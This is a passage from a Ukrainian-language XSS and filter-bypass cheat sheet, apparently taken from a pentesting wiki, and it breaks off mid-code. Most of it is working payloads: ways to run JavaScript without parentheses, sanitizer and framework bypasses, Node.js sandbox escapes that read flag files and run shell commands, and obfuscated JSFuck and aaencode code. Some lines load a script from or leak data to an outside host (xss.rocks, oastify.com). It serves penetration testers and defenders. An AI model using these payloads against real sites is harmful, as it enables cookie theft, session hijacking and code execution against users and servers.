//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript всередині коментаря**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript без дужок**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Виклик довільної функції (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Є **JS code**, який використовує **небезпечні дані, контрольовані атакуючим**, наприклад `location.href`. Атакуючий може зловживати цим, щоб виконати довільний JS-код.  
**Через розширення пояснення** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**

{{#ref}}
dom-xss.md
{{#endref}}

Там ви знайдете детальне **пояснення того, що таке DOM vulnerabilities, як вони провокуються і як їх експлуатувати**.  
Також не забувайте, що **в кінці згаданого посту** можна знайти пояснення про [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Upgrading Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **vulnerable subdomain to XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Надіслання вашої session адміну

Можливо user може поділитися своїм profile з admin, і якщо self XSS знаходиться в profile цього user, а admin відкриє його, він спровокує вразливість.

### Session Mirroring

Якщо ви знайдете self XSS і веб-сторінка має **session mirroring for administrators**, наприклад дозволяє clients просити про допомогу, і щоб admin допоміг вам, він бачитиме те, що ви бачите у вашій session, але зі своєї session.

Ви можете змусити **administrator** спровокувати ваш self XSS і вкрасти його cookies/session.

## Інші обходи

### Bypassing sanitization via WASM linear-memory template overwrite

Коли веб‑додаток використовує Emscripten/WASM, constant strings (наприклад HTML format stubs) розміщуються в writable linear memory. Одиночний in‑WASM overflow (наприклад unchecked memcpy в edit path) може пошкодити суміжні структури і перенаправити записи до цих констант. Перезапис шаблону, такого як "<article><p>%.*s</p></article>" на "<img src=1 onerror=%.*s>", перетворює відфільтрований вхід у значення JavaScript-обробника і призводить до негайного DOM XSS при рендері.

Check the dedicated page with exploitation workflow, DevTools memory helpers, and defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Ви можете перевірити, чи **reflected values** нормалізуються (**unicode normalized**) на сервері (або на боці клієнта) і зловживати цією функцією, щоб обійти захисти. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Через **RoR mass assignment** у HTML вставляються лапки, внаслідок чого обмеження щодо лапок обходиться і всередину тега можна додати додаткові поля (onfocus).\
Приклад форми ([from this report](https://hackerone.com/reports/709336)), якщо ви надішлете payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Пара "Key","Value" буде відображена назад так:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Тоді буде вставлено атрибут onfocus і станеться XSS.

### Спеціальні комбінації
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS з ін'єкцією заголовків у відповіді 302

Якщо ви виявите, що можете **inject headers in a 302 Redirect response**, можна спробувати **змусити браузер виконати довільний JavaScript**. Це **не тривіально**, оскільки сучасні браузери не інтерпретують тіло HTTP-відповіді, якщо код статусу відповіді — 302, тож просто cross-site scripting payload буде марним.

У [**this report**](https://www.gremwell.com/firefox-xss-302) та [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) описано, як тестувати різні протоколи всередині Location header і перевірити, чи якийсь із них дозволяє браузеру інспектувати та виконувати XSS payload у тілі відповіді.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Лише літери, цифри та крапки

Якщо ви можете вказати **callback**, який JavaScript збирається **виконати**, обмежений лише цими символами. [**Read this section of this post**](#javascript-function) щоб дізнатися, як зловживати цією поведінкою.

### Дійсні `<script>` Content-Types для XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Якщо ви намагаєтеся завантажити скрипт з **content-type**, наприклад `application/octet-stream`, Chrome виведе таку помилку:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Єдині **Content-Type**s, які дозволяють Chrome виконати **loaded script**, — це ті, що перелічені в константі **`kSupportedJavascriptTypes`** з [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Типи Script для XSS

(Джерело: [**тут**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Отже, які типи можна вказати, щоб завантажити script?
```html
<script type="???"></script>
```
- **module** (за замовчуванням, нічого пояснювати)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles — це функція, яка дозволяє пакувати набір даних (HTML, CSS, JS…) у файл **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Дозволяє покращити синтаксис import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Ця поведінка була використана в [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) щоб remap a library to eval для зловживання — це може спричинити XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ця функція переважно призначена для вирішення деяких проблем, спричинених pre-rendering. Вона працює так:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types to XSS

(З [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Наступні content types можуть виконувати XSS у всіх браузерах:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? не було в списку, але, здається, я бачив це в CTF)
- application/rss+xml (off)
- application/atom+xml (off)

У інших браузерах інші **`Content-Types`** можуть бути використані для виконання довільного JS, див.: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Якщо сторінка повертає content-type text/xml, можна вказати namespace і виконати довільний JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Спеціальні шаблони заміни

Коли використовується щось на кшталт **`"some {{template}} data".replace("{{template}}", <user_input>)`**, атакуючий може використати [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement) щоб спробувати обійти певні захисти: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Наприклад у [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), це було використано щоб **scape a JSON string** всередині скрипта і виконати довільний код.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Якщо у вас є лише обмежений набір chars для використання, перегляньте ці інші робочі рішення для проблем XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Якщо перед виконанням ненадійного коду **все є undefined** (наприклад, у [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), можливо згенерувати корисні об'єкти "з нічого", щоб зловживати виконанням довільного ненадійного коду:

- Використання import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Опосередкований доступ до `require`

[Згідно з цим](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) модулі в Node.js обгорнуті у функцію, наприклад так:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Отже, якщо з цього модуля ми можемо **викликати іншу функцію**, можна використати `arguments.callee.caller.arguments[1]` з цієї функції, щоб отримати доступ до **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Подібно до попереднього прикладу, можна **використати обробники помилок**, щоб отримати доступ до **wrapper** модуля і отримати функцію **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Різні obfuscations на одній сторінці:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Більш просунутий JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
